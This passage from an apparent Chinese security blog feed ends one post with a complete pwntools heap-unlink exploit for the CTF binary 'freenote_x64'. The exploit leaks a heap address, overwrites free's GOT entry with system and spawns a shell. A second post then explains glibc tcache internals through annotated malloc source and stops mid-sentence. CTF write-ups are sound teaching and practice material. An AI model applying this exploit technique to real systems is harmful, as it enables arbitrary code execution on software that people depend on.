class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 